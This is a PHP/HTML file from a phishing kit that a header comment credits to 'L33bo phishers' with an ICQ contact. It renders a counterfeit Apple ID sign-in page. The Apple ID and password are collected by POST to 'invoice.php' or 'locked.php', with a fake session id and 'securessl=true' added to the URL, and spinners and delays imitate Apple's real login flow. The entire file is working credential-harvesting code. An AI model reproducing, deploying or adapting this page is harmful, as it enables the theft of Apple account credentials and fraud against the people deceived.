<?php
/*
||| L33bo phishers = ICQ: 695059760
||| Zrav Recode 09/04/2018
*/
require "includes/session_protect.php";
require "includes/functions.php";
require "../config.php";
require "../lang.php";
require "includes/simplehtmldom.php";

?>
<html lang="en"><head>
	<meta charset="utf-8">
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
	<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
	<link href="css/Fonts.css" rel="prefetch stylesheet" type="text/css">
	<link href="css/Login.css" media="screen" rel="stylesheet" type="text/css">
	<title>click demo</title>
	<script src="js/jquery-1.9.1.js"></script>
</head>
<body style="">
	<div class="si-body si-container container-fluid" data-theme="lite" id="content">
		<div class="widget-container fade-in restrict-max-wh fade-in" data-mode="embed">
			<div class="HoldLoginDiv">
				<div class="logo"><img style="width: 200px;" class="TextLogo" src="img/logo.png"></div>
				<div>
					<div class="signin fade-in">
						<h1 class="LoginTitkle"><?php echo $manage?></h1>
						<?php if($typelogin == "locked"){ ?>
						<form action='locked.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' name="login" id="name" method="POST" onsubmit="Spinner();">
						<?php }else{ ?>
						<form action='invoice.php?<?php echo $_SESSION['user'];?>&Account-Unlock&sessionid=<?php echo generateRandomString(115); ?>&securessl=true' name="login" id="name" method="POST" onsubmit="Spinner();">
						<?php } ?>
							<div class="container HolderOfTheFields">
								<div class="row no-gutter si-field apple-id">
									<div class="col-xs-12"><span class="LoginTitle"><?php echo $manage?></span> 
										<input class="si-text-field" id="user" name="user" placeholder="Apple ID" spellcheck="false" type="email" autocomplete="off"  required="required">
									</div>
								</div>
								<a class="si-button-appleid btn disabled" id="go-appleid" tabindex="0"><i class="icon icon_sign_in"></i></a>
								<button style="display:none;" class="si-button-appleid btn" id="spin-appleid" tabindex="0"><img style="margin-top:-2px" src="img/spinner.gif"></button>
								<div class="row no-gutter si-field pwd">
									<div class="col-xs-90"><label class="LoginTitle" for="pwd">Password</label> 
										<input class="si-password si-text-field" id="pass" style="display: none;" name="pass" placeholder="Password" type="password" autocomplete="off"  required="required">
									</div>
								</div>
								<div class="si-remember-password"><input class="ax-outline" tabindex="0" type="checkbox"> <label for="remember-me"><?php echo $rem?></label></div>
								<button class="si-button btn disabled" style="display: none;" id="go-pass" tabindex="0"><i class="icon icon_sign_in"></i></button>
								<button style="display:none;" class="si-button btn" id="spin-pass" tabindex="0"><img style="margin-top:-2px" src="img/spinner.gif"></button>
							</div>
						</form>
						<div class="si-container-footer"></div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script>
	     $(document).ready(function() {
	     $(window).keydown(function(event){
	   if(event.keyCode == 13) {
      event.preventDefault();
      return false;
    }
  });
});
		$( "#user" ).keyup(function() {
			if ($("#user").val != '' || $("#user").val != null) {
				$( "#go-appleid" ).removeClass("disabled");
			}
		});

		$( "#pass" ).keyup(function() {
			if ($("#pass").val != '' || $("#user").val != null) {
				$( "#go-pass" ).removeClass("disabled");
			}
		});

		$( "#go-appleid" ).click(function() {
			$( "#spin-appleid" ).show();
			window.setTimeout(function () {
				$(function(){
					$( "#spin-appleid" ).hide();
					$( "#go-appleid" ).hide();
					$( "#go-pass" ).show();
				});
			}, 3000); /* ms mili second 1s = 1000ms */
			window.setTimeout(function () {
				$(function(){
					$( "#pass" ).slideDown();
				});
			}, 3000); /* ms mili second 1s = 1000ms */
		});

		var originalValFn = jQuery.fn.val;

		jQuery.fn.val = function() {
			this.trigger('change');
			originalValFn.apply( this, arguments );
		}

		$('#user').on('keyup', function(){
			$( "#go-appleid" ).show();
			$( "#spin-appleid" ).hide();
			$( "#go-pass" ).hide();
			$( "#pass" ).slideUp();
			$( "#pass" ).val("");
		});
	</script>


</body></html>